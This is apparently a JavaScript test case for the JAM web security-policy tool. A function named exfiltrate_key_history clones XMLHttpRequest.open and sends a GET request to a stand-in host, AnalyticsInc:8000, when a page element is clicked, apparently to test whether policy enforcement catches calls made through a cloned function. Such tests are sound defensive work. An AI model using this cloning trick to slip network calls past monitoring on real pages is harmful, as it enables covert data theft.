
JAM.startProfile('load');
function clone(obj$$16) {
  var v9 = obj$$16 == null;
  if (!v9) {
    v9 = typeof obj$$16 != "object";
  }
  if (v9) {
    return obj$$16;
  }
  var temp = {};
  var key$$14;
  for (key$$14 in obj$$16) {
    var v24 = clone(obj$$16[key$$14]);
    JAM.set(temp, key$$14, v24);
  }
  return temp;
}
function clone2(obj$$17) {
  if (obj$$17.cloneNode) {
    return obj$$17.cloneNode(true);
  }
  var v3;
  if (obj$$17 instanceof Array) {
    v3 = [];
  } else {
    v3 = {};
  }
  var copy = v3;
  var attr;
  for (attr in obj$$17) {
    var v16 = typeof obj$$17[attr] == "function";
    if (!v16) {
      v16 = obj$$17[attr] == null;
    }
    var v11 = v16;
    if (!v11) {
      v11 = !obj$$17[attr].clone2;
    }
    if (v11) {
      JAM.set(copy, attr, obj$$17[attr]);
    } else {
      if (obj$$17[attr] == obj$$17) {
        JAM.set(copy, attr, copy);
      } else {
        var v25 = obj$$17[attr].clone2();
        JAM.set(copy, attr, v25);
      }
    }
  }
  return copy;
}
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v7 = xmlhttp;
  var v26 = clone(xmlhttp.open);
  v7.opennew = v26;
  JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone1", true], JAM.policy.p1);
  xmlhttp.send(null);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

JAM.stopProfile('load');
